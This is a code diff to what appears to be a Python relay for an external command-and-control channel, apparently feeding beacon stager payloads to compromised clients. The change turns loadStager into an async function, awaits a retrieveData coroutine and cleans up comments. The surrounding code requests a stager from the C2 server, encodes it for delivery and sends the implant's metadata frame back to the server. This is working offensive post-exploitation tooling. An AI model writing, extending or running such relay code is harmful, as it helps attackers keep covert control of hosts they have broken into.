@@ -31,12 +31,12 @@ def requestStager(sock):
     return stager_payload
 
 
-def loadStager(sock, beaconId):
-    # Send options to the external_c2 server
+async def loadStager(sock, beaconId):
+    # Send options to the external C2 server
     configureOptions(sock, config.C2_ARCH, config.C2_PIPE_NAME, config.C2_BLOCK_TIME)
 
     if config.debug:
-        print(commonUtils.color("stager configured, sending 'go'", status=False, yellow=True))
+        print(commonUtils.color("Stager configured, sending 'go'", status=False, yellow=True))
 
     # Request stager
     stager_payload = requestStager(sock)
@@ -44,7 +44,7 @@ def loadStager(sock, beaconId):
     if config.debug:
         print(commonUtils.color("STAGER: ", status=False, yellow=True) + "%s" % stager_payload)
 
-    # Prep stager payload
+    # Prepare stager payload
     if config.verbose:
         print(commonUtils.color("Encoding stager payload"))
         # Trick, this is actually done during sendData()
@@ -57,15 +57,18 @@ def loadStager(sock, beaconId):
     # Retrieve the metadata we need to relay back to the server
     if config.verbose:
         print(commonUtils.color("Awaiting metadata response from client"))
-    # Only one response, so this should be the first element of the array
-    metadata = commonUtils.retrieveData(beaconId)[0]
+    
+    # Await the asynchronous function 'retrieveData' since it's a coroutine
+    metadata = (await commonUtils.retrieveData(beaconId))[0]
 
-    # Send the metadata frame to the external_c2 server
+    # Send the metadata frame to the external C2 server
     if config.verbose:
         print(commonUtils.color("Sending metadata to C2 server"))
     if config.debug:
         print(commonUtils.color("METADATA: ", status=False, yellow=True) + "%s" % metadata)
+
     commonUtils.sendFrameToC2(sock, metadata)
 
-    # Pretend we have error handling, return 0 if everything is Gucci
+    # Pretend we have error handling, return 0 if everything is good
     return 0
+
